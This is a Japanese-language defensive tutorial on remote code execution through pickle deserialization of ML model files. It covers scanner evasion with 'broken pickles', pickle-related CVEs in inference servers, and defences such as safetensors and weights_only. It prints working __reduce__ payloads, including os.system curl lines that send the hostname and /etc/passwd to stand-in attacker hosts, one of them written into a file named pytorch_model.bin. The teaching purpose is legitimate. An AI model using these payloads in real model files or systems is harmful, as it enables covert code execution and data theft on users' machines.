## モデルファイルのpickleデシリアライズRCEとsafetensors

機械学習（ML）の世界では、学習済みモデルを「ファイル」として配布・共有するのが当たり前になっている。Hugging Face のようなハブから他人の作った重みをダウンロードし、`torch.load()` や `joblib.load()` の一行で読み込む。この「ダウンロードして読み込むだけ」という何気ない操作こそが、AI システムにおける最も古典的で、しかし今なお現役の遠隔コード実行（RCE：攻撃者が任意のコマンドを標的マシン上で実行できてしまう欠陥）経路である。

本節では、その根源にある Python の **pickle**（オブジェクトをバイト列に変換する標準の直列化＝シリアライズ機構）がなぜコードを実行してしまうのか、検査ツール（picklescan など）がどうやって回避されるのか、そして安全な代替形式 **safetensors** がなぜ安全と言えるのかを、内部の仕組みレベルで解き明かす。防御目的の解説であり、実在サービスや本番環境への無許可の検証、破壊的な手順は扱わない。

### なぜ pickle は「データ」ではなく「プログラム」なのか

まず前提を正しく掴む必要がある。多くの人は「モデルファイルは数値（重み）の塊」だと思っている。ところが PyTorch の従来形式（`.bin` / `.pt` / `.pth`）や scikit-learn の保存形式は、その内部で pickle を使っている。そして pickle は JSON のような「純粋なデータ形式」ではない。

pickle の実体は、**スタックベースの仮想マシン（VM）に対する命令列（opcode＝オペコード、1バイト単位の実行命令）**である。`pickle.loads()` を呼ぶと、Python はそのバイト列を先頭から読み、opcode を1つずつ解釈してオブジェクトを「再構築」する。つまりロード処理は、単にメモリへ数値をコピーするのではなく、**ファイルに書かれた命令を実行するインタプリタ**として動作する。ここが JSON との決定的な差である。JSON パーサは値を組み立てるだけで、関数を呼ぶ手段を一切持たない。pickle は持っている。

> Python's pickle module serializes arbitrary Python objects through a stack-based virtual machine. Unlike JSON, pickle can encode execution instructions.
>
> 出典: AFINE — Pickle Deserialization in ML Pipelines: The RCE That Won't Go Away — https://afine.com/blogs/pickle-deserialization-in-ml-pipelines-the-rce-that-wont-go-away

### 攻撃の核心：`__reduce__` メソッド

pickle が任意のコードを実行できてしまう入口は、`__reduce__` という特殊メソッドにある。

Python のオブジェクトを pickle 化するとき、pickle は対象オブジェクトに `__reduce__()` があればそれを呼び、「**復元に使う callable（呼び出し可能オブジェクト＝関数など）と、その引数のタプル**」を受け取る。デシリアライズ時には、pickle はこのタプルを見て「その callable を、その引数で呼び出せば元のオブジェクトが再構築できる」と解釈し、実際に呼び出す。

本来これは「複雑なオブジェクトを復元する正当な仕組み」だが、`__reduce__` が返す callable を `os.system` のような危険な関数にすり替えれば、ロードした瞬間に任意コマンドが走る。

```python
import os
import pickle

class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker.example/exfil?h=$(hostname) -d @/etc/passwd",))

payload = pickle.dumps(MaliciousPayload())
```

この `payload` を誰かが `pickle.loads()` すると、`os.system("curl ...")` が **モデルオブジェクトが呼び出し元へ返る前に**実行される。つまり「モデルを読み込んだだけ」で、ロード処理を走らせたプロセスの権限のまま、ホスト名や `/etc/passwd` を外部へ送り出す（情報窃取）ことができてしまう。

> The payload executes with the deserializing service's privileges before returning a model object to the caller.
>
> 出典: AFINE — Pickle Deserialization in ML Pipelines: The RCE That Won't Go Away — https://afine.com/blogs/pickle-deserialization-in-ml-pipelines-the-rce-that-wont-go-away

Egnworks の解説は、この性質を「バグではなく仕様どおりの動作」と的確に表現している。メモリ破壊もパースの不具合も必要ない。**ローダは pickle が設計どおりに行うことを、そのまま行っているだけ**である。

```python
import os
import pickle

class Probe:
    def __reduce__(self):
        return (os.system, ("id; curl http://attacker.host/$(hostname)",))

with open("pytorch_model.bin", "wb") as out:
    pickle.dump(Probe(), out)
```

ファイル名が `pytorch_model.bin` である点に注目してほしい。中身は「一見ふつうの PyTorch モデル」だが、開いた（ロードした）瞬間にシェルコマンドが走る。攻撃には解析上の欠陥（parsing bug）もメモリ破壊も要らない。

> This payload executes shell commands when the file loads, requiring no parsing bugs or memory corruption—"the loader does exactly what pickle is designed to do."
>
> 出典: Egnworks — Pickle Deserialization RCE: How a Malicious AI Model Runs Code the Moment You Load It — https://www.egnworks.com/blog/pickle-deserialization-rce-how-a-malicious-ai-model-runs-code-the-moment-you-load-it/

Hugging Face のブログも同じ仕組みを、より簡潔な「PoC（概念実証）」で示している。`os.system` の引数を `touch /tmp/pwned_from_pickle` のような無害な観測用コマンドにすれば、実行が起きたことをファイルの有無で確認できる。

```python
class RCE:
    def __reduce__(self):
        return (os.system, ("touch /tmp/pwned_from_pickle",))

payload = pickle.dumps(RCE())
```

さらに Hugging Face の記事は、ML 特有の「危険な受け口（sink＝入力が最終的に実行・解釈される危険な代入先）」を挙げている。LLM の応答、クラウドストレージ、メッセージキューといった**信頼できない入力を直接 `pickle.loads()` に渡すパターン**である。

```python
def restore_agent_state(state_blob: bytes):
    state = pickle.loads(state_blob)   # 信頼できないバイト列がそのまま sink へ
    return state
```

エージェント（自律的にツールを呼ぶ LLM アプリ）が「状態（state）」を pickle で保存・復元する設計は珍しくない。その `state_blob` が外部から供給されうるなら、それはそのまま RCE 経路になる。

> Direct use of `pickle.loads()` on untrusted input from LLM responses, cloud storage, or message queues creates vulnerability windows.
>
> 出典: Hugging Face Blog — AI for Organizations 2: Risk of Pickle — https://huggingface.co/blog/huseyingulsin/ai-for-organizations-2-risk-of-pickle

### NumPy 経由の見落とされがちな経路

pickle の危険は PyTorch だけの話ではない。NumPy の `np.load()` は、`allow_pickle=True` を指定すると配列の中に埋め込まれた pickle オブジェクトを復元する。ML パイプラインで「モデルや前処理器を `.npy` で保存・配布」している場合、次のようなローダは静かな攻撃経路になる。

```python
def load_model(model):
    return np.load(model, encoding="latin1", fix_imports=True, allow_pickle=1)
```

`allow_pickle=1`（= True）が付いている限り、`.npy` ファイルの中の悪意ある `__reduce__` がロード時に発火する。NumPy がバージョンによって `allow_pickle` の既定値を False に変えたのは、まさにこのリスクを封じるためである。**「pickle を許可する引数」を安易に True にしない**、という原則がここでも効く。

> 出典: SecDim — LLM to RCE using broken pickles — https://secdim.com/blog/post/llm-to-rce-using-broken-pickles-9359/

### 検査ツール picklescan と、その「壊れた pickle」による回避

pickle が危険だと分かっているなら、「ロード前に中身を検査すればよい」と考えるのが自然だ。実際、Hugging Face は modelscan / picklescan といったツールでアップロードされたファイルを走査し、危険な global（`os.system` のような外部関数の参照）を検出しようとする。

```bash
pip install picklescan
picklescan --huggingface ykilcher/totally-harmless-model
```

**picklescan の原理**：pickle を実際に実行（unpickle）するのではなく、opcode 列だけを走査し、`GLOBAL` / `STACK_GLOBAL`（外部のモジュール・関数をスタックに載せる opcode）で参照されるシンボルを、危険関数のブラックリスト（`posix system`、`os.system`、`subprocess` など）と突き合わせる。正しく作られた RCE ペイロードなら opcode 列のどこかに `"posix system"` が現れるので、検出できるはずである。

> **How picklescan works:** It compares opcodes against a blacklist of dangerous functions. ... a properly constructed exploit contains `"posix system"` which should trigger detection.
>
> 出典: SecDim — LLM to RCE using broken pickles — https://secdim.com/blog/post/llm-to-rce-using-broken-pickles-9359/

#### 「壊れた pickle（broken pickle）」による回避の仕組み

SecDim の記事が示す回避テクニックの肝は、**pickle を「わざと壊す」こと**にある。pickle のバイト列は最後に `.`（STOP opcode、16進で `2e`）で終わる。攻撃者は STOP opcode の直前に**不正な（余分な）バイトを挿入**して、パーサから見ると「途中で破綻したファイル」を作る。

```
正常な終端: ...71161747112622   （valid pickle）
壊した終端: ...71161747112582e   （58 と 2e を追加して壊す）
```

なぜこれで回避できるのか。ポイントは **picklescan の走査ループと、Python 本体の unpickle の「実行順序」の違い**である。

- 旧バージョンの picklescan（**バージョン 0.0.18 以前**）は、opcode を順に読む途中で不正バイトに出くわすと**例外を投げてループを中断**していた。危険な opcode が壊れた箇所より後ろにあれば、そこへ辿り着く前に走査が止まり、**「危険なし」と誤判定**される。
- 一方、実際にファイルをロードする側（`pickle.loads()`）は、**危険な `REDUCE`（callable を引数で呼び出す opcode）を先に実行してしまってから**、最後の壊れた部分で例外になる。つまり「例外が出た＝失敗」に見えても、**例外が起きる前に悪意あるコードは既に実行済み**なのだ。

> Despite scan failures, the exploit executed successfully because the exception occurred *after* malicious code executed during the initial unpickling attempt.
>
> 出典: SecDim — LLM to RCE using broken pickles — https://secdim.com/blog/post/llm-to-rce-using-broken-pickles-9359/

これは検査ツール全般に通じる普遍的な教訓である。**「検査器が安全にパースできるもの」と「実行器が実際に実行するもの」は同一ではない**。両者の解釈の差（パーサ差異）がある限り、片方をすり抜けてもう片方で発火するペイロードが作れる。

#### picklescan 側の修正と、それでも残る限界

現在の picklescan は、例外が起きても**走査を止めずに続行**するよう改善され、この「壊れた pickle」パターンでも危険な import を検出できるようになった（対象：修正後バージョン）。

しかし「パターンマッチによる検査」という手法そのものに構造的な限界がある。AFINE の記事は、2025 年時点で複数の回避 CVE が報告されたことを整理している。

- **Sonatype** が picklescan に対し、ZIP のフラグビット操作や非標準拡張子を悪用してブラックリストを回避する **4 件の CVE** を発見。
- **JFrog** が独立に **3 件のゼロデイ**を発見。
- 学術研究は Python 標準ライブラリ内に「**133 個の悪用可能な function gadget（部品として悪用できる正規関数）**」を特定し、現行スキャナに対し「**ほぼ 100% の回避率**」を達成したと報告。

> The fundamental issue: pickle's Turing-completeness makes pattern-based detection inherently fragile.
>
> 出典: AFINE — Pickle Deserialization in ML Pipelines: The RCE That Won't Go Away — https://afine.com/blogs/pickle-deserialization-in-ml-pipelines-the-rce-that-wont-go-away

pickle は**チューリング完全**（任意の計算を表現できる）なので、危険関数を「直接名指し」せずとも、無害に見える標準関数を組み合わせて同じ効果を作れる。したがって「危険な名前を探す」ブラックリスト方式は原理的に破られやすい。AFINE はさらに、Brown 大学の 2025 年の調査で「Hugging Face の人気リポジトリの約半数が依然として pickle モデルを含む」こと、そして「5 大 ML フレームワークにまたがる 22 種類の pickle ロード経路のうち 19 種類を既存スキャナが見落としていた」ことを紹介している。

### 検査すべきは「ファイル単体」だけではない：サービス基盤の pickle 経路

pickle RCE は「悪意あるモデルファイルを掴まされる」ケースだけではない。**LLM の配信・推論基盤（serving infrastructure）が、ネットワーク越しの通信に pickle を使っている**と、モデルが正規でもサービス全体が乗っ取られる。AFINE と Egnworks が挙げる代表例が **vLLM の CVE-2025-32444** である。

#### vLLM CVE-2025-32444（CVSS 10.0：最高深刻度）

vLLM は高スループットな LLM 推論サーバである。その **Mooncake 連携**機能が、**ZeroMQ（軽量メッセージングライブラリ）ソケットを `0.0.0.0`（全ネットワークインタフェース）にバインドし、認証なしで** `recv_pyobj()` を呼んでいた。`recv_pyobj()` は受信したバイト列を内部で pickle デシリアライズする関数である。

つまり、そのソケットに到達できる**ネットワーク上の任意のホストが、悪意ある pickle を送りつけるだけで RCE を達成**できた。モデルファイルの善し悪しは無関係で、通信路そのものが `pickle.loads()` の sink になっていたわけである。CVSS 10.0 という最高スコアは、認証不要・ネットワーク到達可能・完全な権限奪取という三拍子を反映している。

> **vLLM CVE-2025-32444 (CVSS 10.0):** The Mooncake integration used `recv_pyobj()` on ZeroMQ sockets bound to `0.0.0.0` without authentication. Any network host could connect and achieve RCE.
>
> 出典: AFINE — Pickle Deserialization in ML Pipelines: The RCE That Won't Go Away — https://afine.com/blogs/pickle-deserialization-in-ml-pipelines-the-rce-that-wont-go-away

同種の欠陥は他の基盤にも広がっている。

- **LightLLM CVE-2026-26220（2026 年 2 月）**：prefill-decode 分離システムの WebSocket エンドポイントが、受信フレームを `pickle.loads()` に直接渡していた。しかも nonce（使い捨ての認証用ランダム値）ベースの認証が**既定で空文字列**になっており、チェックが実質無効化されていた。

```python
data = await websocket.receive_bytes()
obj = pickle.loads(data)   # 信頼できない WebSocket バイナリフレームを直接 unpickle
```

- **manga-image-translator CVE-2026-26215**：同様の pickle ベース RCE。
- **Hugging Face LeRobot CVE-2026-25874（CVSS 8.8）**：gRPC 越しの pickle デシリアライズを、送信元検証なしで行っていた（Egnworks が言及）。

これらに共通する構造は、「**内部通信だから信頼できる**」という暗黙の前提のもとで pickle を使い、そこへネットワーク経由で untrusted なデータが流れ込む、という点である。

> 出典: AFINE — Pickle Deserialization in ML Pipelines: The RCE That Won't Go Away — https://afine.com/blogs/pickle-deserialization-in-ml-pipelines-the-rce-that-wont-go-away ／ Egnworks — Pickle Deserialization RCE — https://www.egnworks.com/blog/pickle-deserialization-rce-how-a-malicious-ai-model-runs-code-the-moment-you-load-it/

#### 現実の攻撃事例

理論だけの話ではない。SecDim・SecDim 参照の報告によれば、**2025 年 2 月に Reverse Engineering Labs（ReversingLabs）が Hugging Face 上で悪意あるモデルを発見**した。これらは本節で解説した「壊れた pickle」テクニックを使ってスキャナを回避し、ロード時にリバースシェル（攻撃者へ接続を張り返して遠隔操作を許す仕掛け）を張るよう作られていた。

> In February 2025, Reverse Engineering Labs identified malicious models on Hugging Face exploiting these techniques, designed to execute reverse shells granting unauthorized system access.
>
> 出典: SecDim — LLM to RCE using broken pickles — https://secdim.com/blog/post/llm-to-rce-using-broken-pickles-9359/

### 防御 1：`weights_only` で pickle の「実行能力」を封じる

もし pickle 形式を使い続けざるを得ないなら、まず打つべき手が PyTorch の **`weights_only=True`** である。

PyTorch は **バージョン 2.0** で `torch.load()` に `weights_only` 引数を導入した（そして後のバージョンでは既定値が `True` へ移行している。使用中のバージョンで明示指定するのが確実）。これを True にすると、unpickle 時に**テンソル復元に必要な安全な opcode / global だけを許可リストで通し、`os.system` のような任意 callable の呼び出しを拒否**する。

```python
# 危険：無制限に pickle をデシリアライズする
model.load_state_dict(torch.load("checkpoint.pt"))

# 安全側：テンソル関連の opcode のみを許可
model.load_state_dict(torch.load("checkpoint.pt", weights_only=True))
```

なぜ効くのか。前述のとおり RCE は `REDUCE` opcode が任意の callable を呼ぶことに由来する。`weights_only=True` は、この「任意 callable 呼び出し」を許可リスト外として遮断し、実質的に pickle VM の「プログラム実行能力」を奪う。ただし、独自クラスを含むモデルはロードできなくなる場合があり、また過去には許可リスト自体の回避が議論されたこともある。**あくまで多層防御の一枚**として位置づけるのが正しい。

> Before version 2.0, `torch.load(path)` performed unrestricted pickle deserialization. PyTorch 2.0 introduced `weights_only=True` parameter
>
> 出典: AFINE — Pickle Deserialization in ML Pipelines: The RCE That Won't Go Away — https://afine.com/blogs/pickle-deserialization-in-ml-pipelines-the-rce-that-wont-go-away

### 防御 2：本命は safetensors への移行

最も根本的な対策は、**そもそもコードを実行できない形式に移す**ことである。それが Hugging Face が開発した **safetensors** である。

#### safetensors がなぜ安全なのか（フォーマット内部）

safetensors のファイル構造は極めて単純で、次の要素しか持たない。

1. 先頭 **8 バイト**：後続する **JSON ヘッダの長さ**（バイト数）を示すリトルエンディアン整数。
2. **JSON ヘッダ**：各テンソルの名前・データ型（dtype）・形状（shape）・データ本体の**バイトオフセット**を記述したメタデータ。
3. **生のバイナリ**：テンソルの数値データそのもの。

重要なのは、この形式には **callable を参照する仕組みも、命令（opcode）を実行する VM も一切存在しない**という点である。ロード処理がやれることは「**JSON で示された位置から数値をメモリへコピーする**」だけで、それ以上でも以下でもない。pickle が「命令列を実行するインタプリタ」だったのに対し、safetensors ローダは「数値をコピーする単純な読み取り機」に過ぎない。だから設計上 RCE が起こりえない。

> Safetensors stores "tensors and metadata only" with "no mechanism to call code." Loading it "can copy numbers into memory and nothing else."
>
> 出典: Egnworks — Pickle Deserialization RCE — https://www.egnworks.com/blog/pickle-deserialization-rce-how-a-malicious-ai-model-runs-code-the-moment-you-load-it/

```python
from safetensors.torch import load_file

state = load_file("model.safetensors")
```

Hugging Face のブログも同様に、safetensors は「8 バイトのヘッダに JSON のテンソルメタデータ、その後に生のバイナリデータ」という構成であり、pickle のようなコード実行能力を持たないため「安全なモデル利用に関する懸念を解消する」と述べている。safetensors は Hugging Face のエコシステムで既定形式として推進されており（記事は 2022 年以降の既定化に言及）、多くの人気モデルが `.safetensors` を併配布している。

> 出典: Hugging Face Blog — AI for Organizations 2: Risk of Pickle — https://huggingface.co/blog/huseyingulsin/ai-for-organizations-2-risk-of-pickle

なお、用途に応じた「pickle を使わない代替」は他にもある。AFINE は、計算グラフの受け渡しには **ONNX**、プロセス間通信（IPC）には **MessagePack** を推奨し、テンソル重みは safetensors に寄せる、という使い分けを挙げている。

### 防御 3：ロード前スキャンとハッシュ検証（多層防御）

形式移行が完了するまでの間、あるいは外部モデルを受け入れる境界では、以下を組み合わせる。

#### ロード前スキャン（fickling / picklescan / modelscan）

`pickle.loads()` を呼ぶ**前に**、opcode 列を静的に解析して危険な import を洗い出す。Egnworks は `fickling` の利用を挙げている。

```bash
fickling --check-safety pytorch_model.bin
```

これは `os` や `subprocess` といった実行プリミティブ（コマンド実行の原始的手段）の import を検出して警告する。ただし前述のとおり、スキャナは「壊れた pickle」や gadget 連鎖で回避されうるため、**これ単独を最終防御にしてはならない**。CI/CD で `.bin` / `.pkl` / `.pt` を必ず走査し、危険判定が出たらパイプラインを止めて隔離（quarantine）する運用と組み合わせる。

#### ハッシュ検証（最低限の防御）

配布元で計算した SHA-256 と、手元で読み込むファイルのハッシュを突き合わせ、一致しなければロードしない。改ざんされた（＝別物の）ファイルを掴まされる事故を防ぐ、最も安価な一枚である。

```python
import hashlib
import pickle

def load_verified_model(path, expected_sha256):
    with open(path, "rb") as f:
        data = f.read()
    actual = hashlib.sha256(data).hexdigest()
    if actual != expected_sha256:
        raise ValueError(f"Model file hash mismatch: {actual}")
    return pickle.loads(data)
```

注意：ハッシュ検証は「**期待どおりのファイルか**」を保証するだけで、「**そのファイル自体が安全か**」は保証しない。悪意ある pickle でもハッシュは一致する。あくまで改ざん検知であって、内容の無害性検証ではない。

> 出典: AFINE — Pickle Deserialization in ML Pipelines — https://afine.com/blogs/pickle-deserialization-in-ml-pipelines-the-rce-that-wont-go-away ／ Egnworks — Pickle Deserialization RCE — https://www.egnworks.com/blog/pickle-deserialization-rce-how-a-malicious-ai-model-runs-code-the-moment-you-load-it/

#### 検知（ロード後の異常監視）

万一を想定し、SIEM（セキュリティ監視基盤）で「**モデルファイルを開いた直後に Python プロセスがシェルやネットワークツールを spawn（起動）した**」という振る舞いを検知するルールを置く。Egnworks が推奨するこの post-load 検知は、事前スキャンをすり抜けた攻撃を実行時に捕捉する最後の網である。

### 根本原因と、組織としての向き合い方

AFINE はこの問題の本質を一言でまとめている。「**脆弱性はコードではなくデータの中にある（The vulnerability is in the data, not the code）**」。ローダのソースコードをいくら静的解析しても、実行時に読み込む「ファイルの中身」を見なければ危険は判定できない。しかも中身の pickle はチューリング完全なので、完全な事前判定は原理的に困難である。

したがって、単発のツール導入では足りない。研究コミュニティは、ライブラリごとに「許可する復元手続き」をホワイトリスト化する **PickleBall（CCS 2025）** のような、より厳密なアプローチも提案している。実務としては次の優先順位が現実的だ。

1. **可能な限り safetensors（重み）／ONNX（グラフ）／MessagePack（IPC）へ移行**し、pickle の実行能力を土台から排除する。
2. pickle が残る箇所は **`weights_only=True`** を明示し、任意 callable の呼び出しを封じる。
3. 外部由来のモデル・通信は**ロード前スキャン＋ハッシュ検証＋信頼リポジトリのホワイトリスト**で境界を固め、サンドボックスで先行検証する。
4. **推論基盤の内部通信（ZeroMQ / WebSocket / gRPC）が pickle を使っていないか**を棚卸しし、認証とバインド先（`0.0.0.0` に晒していないか）を点検する。vLLM CVE-2025-32444 が示したのは、モデルではなく「基盤の通信路」が最悪の穴になりうるという事実である。
5. 学習時にモデルへ**署名**し、鍵管理を分離して来歴（provenance）を保証する。

> The organizational gap: ML teams lack systematic security thinking about model artifact lifecycles and serving infrastructure.
>
> 出典: AFINE — Pickle Deserialization in ML Pipelines: The RCE That Won't Go Away — https://afine.com/blogs/pickle-deserialization-in-ml-pipelines-the-rce-that-wont-go-away

### まとめ

- pickle は「データ形式」ではなく「命令列を実行する VM」であり、`__reduce__` が返す callable をロード時に呼ぶため、モデルを**読み込んだだけで RCE** が成立する。
- 検査ツール（picklescan など）は「壊れた pickle」や gadget 連鎖で回避されうる。**スキャナが安全にパースできる範囲と、実行器が実際に実行する範囲のズレ**が回避の温床になる。旧 picklescan（0.0.18 以前）は例外でループ中断する挙動を突かれた。
- 危険はファイル単体に留まらない。**vLLM CVE-2025-32444（CVSS 10.0）**のように、推論基盤が認証なしのネットワーク通信で pickle をデシリアライズしていれば、正規モデルでもサービスが乗っ取られる。
- 最終解は **safetensors**（コード実行機構を持たない「数値コピー専用」形式）への移行。過渡期は **`weights_only=True`**、ロード前スキャン、ハッシュ検証、通信路の点検を多層に重ねる。
